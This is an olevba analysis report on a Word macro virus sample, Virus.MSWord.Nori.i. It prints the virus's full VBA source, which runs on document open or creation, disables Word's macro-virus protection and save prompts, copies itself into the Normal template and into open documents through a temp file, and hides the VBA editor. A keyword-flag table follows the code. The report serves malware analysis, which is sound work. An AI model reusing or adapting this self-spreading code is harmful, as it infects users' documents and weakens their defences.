olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nori.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nori.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Unit.bas 
in file: ./Virus.MSWord.Nori.i - OLE stream: 'Macros/VBA/Unit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                Sub ToN()
'Iron
                                                                                                On Error Resume Next
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"

                                                                                                With NormalTemplate.VBProject.VBComponents
                                                                                                               '8
                                                                                                    Kill (file)
                                                                                                End With
                                                                                                End Sub
                                                                                                Sub ToA()
                                                                                                On Error Resume Next
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"
                                                                                                With ActiveDocument.VBProject.VBComponents
                                                                                                                                          '18
                                                                                                                                          '18
                                                                                                    Kill (file)
                                                                                                End With
                                                                                                End Sub
                                                                                                Sub AutoOpen()
                                                                                                On Error Resume Next
                                                                                                If options.VirusProtection Then options.VirusProtection = Not options.VirusProtection
                                                                                                If options.ConfirmConversions Then options.ConfirmConversions = Not options.ConfirmConversions
                                                                                                If options.SaveNormalPrompt Then options.SaveNormalPrompt = Not options.SaveNormalPrompt
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"
                                                                                                If NormalTemplate.VBProject.VBComponents.Item(Un).CodeModule.Lines(2, 1) <> "'Iron" Then
                                                                                                ActiveDocument.VBProject.VBComponents(Un).Export (file)
                                                                                                With ActiveDocument.VBProject.VBComponents(Un).CodeModule
                                                                                                    .DeleteLines 8
                                                                                                    .InsertLines 8, "   .import (file)"
                                                                                                End With
                                                                                                Call ToN
                                                                                                With ActiveDocument.VBProject.VBComponents(Un).CodeModule
                                                                                                    .DeleteLines 8
                                                                                                    .InsertLines 8, "                                                                                                               '8"
                                                                                                End With
                                                                                                End If
                                                                                                If ActiveDocument.VBProject.VBComponents.Item(Un).CodeModule.Lines(2, 1) <> "'Iron" Then
                                                                                                    NormalTemplate.VBProject.VBComponents(Un).Export (file)
                                                                                                    With NormalTemplate.VBProject.VBComponents(Un).CodeModule
                                                                                                        .DeleteLines 18
                                                                                                        .InsertLines 18, "   ActiveDocument.VBProject.VBComponents.import (file)"
                                                                                                    End With
                                                                                                    Call ToA
                                                                                                    With NormalTemplate.VBProject.VBComponents(Un).CodeModule
                                                                                                        .DeleteLines 18
                                                                                                        .InsertLines 18, "                                                                                                                                          '18"
                                                                                                    End With
                                                                                                    NormalTemplate.Save
                                                                                                End If
                                     
                                                                                                End Sub
                                                                                                Sub ViewVBCode()
                                                                                                  On Error Resume Next
                                                                                                  Application.ShowVisualBasicEditor = False
                                                                                                End Sub
                                                                                                Private Sub Document_New()
                                                                                                 Call AutoOpen
                                                                                                End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

